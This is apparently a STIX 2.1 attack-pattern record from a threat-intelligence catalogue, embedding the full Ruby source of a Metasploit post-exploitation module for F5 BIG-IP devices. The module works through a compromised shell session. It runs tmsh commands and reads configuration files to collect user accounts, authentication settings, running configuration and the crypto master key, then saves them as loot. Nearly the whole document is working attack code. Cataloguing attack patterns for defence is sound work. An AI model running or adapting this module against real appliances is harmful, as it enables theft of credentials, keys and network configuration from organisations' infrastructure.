{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76e7134e-ac0a-4016-81d3-f088e6845909",
    "created": "2024-08-14T16:33:17.990314Z",
    "modified": "2024-08-14T16:33:17.990317Z",
    "name": "F5 Gather Device General Information",
    "description": " This module collects a F5's device information and configuration.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/networking/gather/enum_f5.rb",
            "external_id": "enum_f5.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::F5\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 Gather Device General Information',\n        'Description' => %q{\n          This module collects a F5's device information and configuration.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'h00die'],\n        'SessionTypes' => [ 'shell' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def run\n    # Get device prompt\n    prompt = session.shell_command('?')\n    started_tmos = false\n    unless prompt.include? 'Commands:'\n      started_tmos = true\n      print_status('Moving to TMOS prompt')\n      session.shell_command('tmsh')\n    end\n    prompt = session.shell_command('')\n\n    # Get version info\n    system_out = session.shell_command('show /sys version')\n    # https://support.f5.com/csp/article/K8759\n    ver_loc = store_loot('f5.version',\n                         'text/plain',\n                         session,\n                         system_out.strip,\n                         'config.txt',\n                         'F5 Version')\n    vprint_good(\"Config information stored in to loot #{ver_loc}\")\n    if /^Main Package(?<content>.+)\\n\\n/m =~ system_out # just capture the content to parse\n      ver = []\n      if /^\\s+Product\\s+(?<product>[\\w-]+)$/ =~ content\n        ver << product\n      end\n      if /^\\s+Version\\s+(?<version>[\\d.]+)$/ =~ content\n        ver << version\n      end\n      if /^\\s+Build\\s+(?<build>[\\d.]+)$/ =~ content\n        ver << build\n      end\n      print_good(\"Version: #{ver.join(' ')}\") unless ver.empty?\n    else\n      print_bad('Unable to obtain system version information')\n    end\n    # run additional information gathering\n\n    enum_tmos_configs(prompt)\n    if started_tmos\n      session.shell_command('quit') # exit tmos\n    else\n      session.shell_command('bash') # go to bash from tmos\n    end\n    enum_configs(prompt)\n  end\n\n  def enum_tmos_configs(prompt)\n    host = session.session_host\n    port = session.session_port\n    exec_commands = [\n      {\n        'cmd' => 'show sys',\n        'fn' => 'show_sys',\n        'desc' => 'Get Device System Information on F5 Device'\n      },\n      {\n        'cmd' => 'show auth',\n        'fn' => 'show_auth',\n        'desc' => 'Get User Account and Authentication Information on F5 Device'\n      },\n      {\n        'cmd' => 'show cm',\n        'fn' => 'show_cm',\n        'desc' => 'Get Configuration Management Information on F5 Device'\n      },\n      {\n        'cmd' => 'show net',\n        'fn' => 'show_net',\n        'desc' => 'Get Network Information on F5 Device'\n      },\n      {\n        'cmd' => 'show running-config',\n        'fn' => 'show_running_config',\n        'desc' => 'Get Running Config on F5 Device'\n      },\n      {\n        'cmd' => 'show sys crypto master-key',\n        'fn' => 'show_crypto_key',\n        'desc' => 'Get Crypto Master Key on F5 Device'\n      },\n    ]\n    exec_commands.each do |ec|\n      command = ec['cmd']\n      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')\n      if cmd_out.include?('Display all')\n        cmd_out += session.shell_command('y')\n      end\n      if cmd_out.include?('---(less')\n        cmd_out += session.shell_command(\" \\n\" * 20) # 20 pages should be enough\n      end\n\n      # loop to ensure we get all content within the 5 sec window\n      # rubocop:disable Lint/AssignmentInCondition\n      loop do\n        break unless out_tmp = session.shell_read\n\n        cmd_out << out_tmp\n      end\n      # rubocop:enable Lint/AssignmentInCondition\n\n      print_status(\"Gathering info from #{command}\")\n      cmd_loc = store_loot(\"F5.#{ec['fn']}\",\n                           'text/plain',\n                           session,\n                           cmd_out.strip,\n                           \"#{ec['fn']}.txt\",\n                           ec['desc'])\n      vprint_good(\"Saving to #{cmd_loc}\")\n      f5_config_eater(host, port, cmd_out.strip, false)\n    end\n  end\n\n  def enum_configs(prompt)\n    host = session.session_host\n    port = session.session_port\n    # https://support.f5.com/csp/article/K26582310\n    exec_commands = [\n      {\n        # High-level traffic management and system configuration, such as virtual servers,\n        # profiles, access policies, iRules, and authentication settings\n        'cmd' => 'cat /config/bigip.conf',\n        'fn' => 'bigip.conf',\n        'desc' => 'Get Config on F5 Device'\n      },\n      {\n        # Base-level network and system configuration, such as VLANs, self IPs,\n        # device service clustering (DSC), and provisioning\n        'cmd' => 'cat /config/bigip_base.conf',\n        'fn' => 'bigip_base.conf',\n        'desc' => 'Get Base Config on F5 Device'\n      },\n      {\n        # BIG-IP GTM/DNS-specific configuration such as Wide IPs, pools, data centers,\n        # and servers\n        'cmd' => 'cat /config/bigip_gtm.conf',\n        'fn' => 'bigip_gtm.conf',\n        'desc' => 'Get GTM Config on F5 Device'\n      },\n      {\n        # Custom iApps templates\n        'cmd' => 'cat /config/bigip_script.conf',\n        'fn' => 'bigip_script.conf',\n        'desc' => 'Get iApps templates on F5 Device'\n      },\n      {\n        # User account configuration\n        'cmd' => 'cat /config/bigip_user.conf',\n        'fn' => 'bigip_user.conf',\n        'desc' => 'Get User Config on F5 Device'\n      },\n      {\n        # Custom BIG-IP system alerts\n        'cmd' => 'cat /config/user_alert.conf',\n        'fn' => 'user_alert.conf',\n        'desc' => 'Get System Alerts on F5 Device'\n      },\n    ]\n    exec_commands.each do |ec|\n      command = ec['cmd']\n      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')\n      print_status(\"Gathering info from #{command}\")\n      if cmd_out.include?('No such file or directory') || cmd_out.strip == ''\n        print_error('File not found or empty')\n        next\n      end\n      cmd_loc = store_loot(\"F5.#{ec['fn']}\",\n                           'text/plain',\n                           session,\n                           cmd_out.strip,\n                           \"#{ec['fn']}.txt\",\n                           ec['desc'])\n      vprint_good(\"Saving to #{cmd_loc}\")\n      f5_config_eater(host, port, cmd_out.strip, false)\n    end\n  end\nend\n"
}